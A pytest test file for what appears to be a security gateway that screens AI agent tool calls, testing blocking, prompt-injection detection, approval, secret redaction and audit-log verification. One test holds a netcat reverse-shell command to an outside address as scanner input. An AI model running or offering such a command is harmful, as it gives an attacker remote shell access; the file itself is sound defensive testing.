import pytest
from app.database.session import init_db, SessionLocal
from app.main import seed_initial_data
from app.api.demo import run_scenario
from app.api.audit import verify_audit_hash_chain
from app.api.security import scan_payload

@pytest.fixture(autouse=True, scope="module")
def setup_test_environment():
    init_db()
    seed_initial_data()

def test_scenario_a_normal_operation():
    with SessionLocal() as db:
        data = run_scenario("A", db)
        assert data["execution"]["decision"] == "ALLOW"
        assert data["execution"]["risk_score"] <= 19
        assert data["execution"]["status"] == "completed"

def test_scenario_b_dangerous_command_blocked():
    with SessionLocal() as db:
        data = run_scenario("B", db)
        assert data["execution"]["decision"] == "BLOCK"
        assert data["execution"]["risk_score"] >= 80
        assert data["execution"]["status"] == "blocked"

def test_scenario_c_sensitive_file_blocked():
    with SessionLocal() as db:
        data = run_scenario("C", db)
        assert data["execution"]["decision"] == "BLOCK"
        assert data["execution"]["status"] == "blocked"

def test_scenario_d_prompt_injection_response_blocked():
    with SessionLocal() as db:
        data = run_scenario("D", db)
        assert data["inspection_result"]["action"] == "BLOCK_RESPONSE"
        assert data["inspection_result"]["injection_detected"] is True

def test_scenario_e_human_approval_required():
    with SessionLocal() as db:
        data = run_scenario("E", db)
        assert data["execution"]["decision"] == "REQUIRE_APPROVAL"
        assert data["execution"]["approval_id"] is not None

def test_scenario_f_secret_redacted():
    with SessionLocal() as db:
        data = run_scenario("F", db)
        assert data["inspection_result"]["action"] == "REDACT_SENSITIVE_DATA"
        assert data["inspection_result"]["secrets_redacted_count"] > 0

def test_audit_hash_chain_verification():
    with SessionLocal() as db:
        run_scenario("A", db)
        verification = verify_audit_hash_chain(db)
        assert verification["status"] == "VERIFIED"
        assert verification["total_records"] > 0

def test_security_scan_payload():
    payload = {"command": "nc -e /bin/sh 1.2.3.4 9999"}
    res = scan_payload(payload, tool_name="run_command")
    assert res["max_risk_score"] >= 80
    assert res["classification"] == "Critical"
    assert res["recommended_action"] == "BLOCK"
